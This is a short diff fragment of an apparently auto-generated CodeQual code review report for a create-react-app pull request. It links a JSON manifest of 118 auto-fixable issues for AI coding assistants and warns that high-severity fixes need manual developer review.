+📦 **Manifest file** (for AI assistants with lazy loading): [all-issues-manifest.json](https://ftjhmbbcuqjqmmbaymqb.supabase.co/storage/v1/object/public/v9-attachments/create-react-app-pr0-1763038519302/all-issues-manifest.json)
+- Contains: All 118 auto-fixable issues with fix patterns
+- **Lazy loading**: Critical issues embedded (instant), high/medium/low lazy loaded in background
+- **Use with**: AI assistants (Cursor Chat, GitHub Copilot) if LSP doesn't work in your IDE
+- **Difference from LSP**: Manifest uses lazy loading by severity; LSP has all fixes in one file
+
+> ⚠️ **Important**: Critical and high-severity auto-fixes require manual code review before applying. Auto-generated fixes are suggestions that should be validated by a developer to ensure they don't introduce regressions or break business logic.
+
+
+---
+
+*Generated by CodeQual V9 - Grouped Report Format (Bug #34 Lazy Loading)*  
+*2025-11-13T12:55:21.450Z*
